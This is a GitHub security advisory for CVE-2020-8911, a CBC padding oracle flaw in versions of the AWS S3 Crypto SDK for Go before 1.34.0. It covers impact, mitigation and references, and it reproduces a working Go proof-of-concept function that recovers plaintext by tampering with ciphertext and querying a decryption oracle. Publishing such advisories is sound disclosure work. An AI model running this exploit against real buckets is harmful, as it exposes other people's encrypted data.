# [M] CBC padding oracle issue in AWS S3 Crypto SDK for golang

## Summary
Severity: Medium
Advisory: GHSA-f5pg-7wfw-84q9
CVE: CVE-2020-8911
CWE: CWE-327
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2022-02-11
Source: https://github.com/advisories/GHSA-f5pg-7wfw-84q9
Type: github-advisory

## Affected
- Go: `github.com/aws/aws-sdk-go` — affected >=0 <1.34.0

## Details
### Summary

The golang AWS S3 Crypto SDK is impacted by an issue that can result in loss of confidentiality and message forgery. The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.

### Risk/Severity

The vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.

### Impact

This advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non "strict" versions of C++ and Java S3 Crypto SDKs being present as well.

V1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.

This exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) `128*length(plaintext)` queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.

This issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.

### Mitigation

Using the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.

### Proof of concept

A [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.

This particular issue is described in [padding_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go):

```golang
func PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {
	data, header, err := input.S3Mock.GetObjectDirect(bucket, key)
	if alg := header.Get("X-Amz-Meta-X-Amz-Cek-Alg"); alg != "AES/CBC/PKCS5Padding" {
		return "", fmt.Errorf("Algorithm is %q, not CBC!", alg)
	}
	length, err := strconv.Atoi(header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Length"))
	padding := byte(len(data) - length)
	plaintext := make([]byte, length)
	for i := length - 1; i >= 0; i-- {
		newLength := 16 * (i/16 + 1)
		dataCopy := make([]byte, newLength)
		headerCopy := header.Clone()
		copy(dataCopy, data)
		// Set Padding
		newPadding := byte(newLength - i)
		for j := i + 1; j < newLength; j++ {
			var oldValue byte
			if j >= length {
				oldValue = padding
			} else {
				oldValue = plaintext[j]
			}
			dataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)
			if err != nil {
				return "", err
			}
		}
		// Guess
		for c := 0; c < 256; c++ {
			dataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)
			input.S3Mock.PutObjectDirect(bucket, key+"guess", dataCopy, headerCopy)
			if input.Oracle(bucket, key+"guess") {
				plaintext[i] = byte(c)
				break
			}
			dataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)
		}
	}
	return string(plaintext), nil
}
```

## References
- https://github.com/google/security-research/security/advisories/GHSA-f5pg-7wfw-84q9
- https://nvd.nist.gov/vuln/detail/CVE-2020-8911
- https://github.com/aws/aws-sdk-go/pull/3403
- https://github.com/aws/aws-sdk-go/commit/1e84382fa1c0086362b5a4b68e068d4f8518d40e
- https://github.com/aws/aws-sdk-go/commit/ae9b9fd92af132cfd8d879809d8611825ba135f4
- https://aws.amazon.com/blogs/developer/updates-to-the-amazon-s3-encryption-client/?s=09
- https://bugzilla.redhat.com/show_bug.cgi?id=1869800
- https://github.com/aws/aws-sdk-go
- https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc
- https://pkg.go.dev/vuln/GO-2022-0646
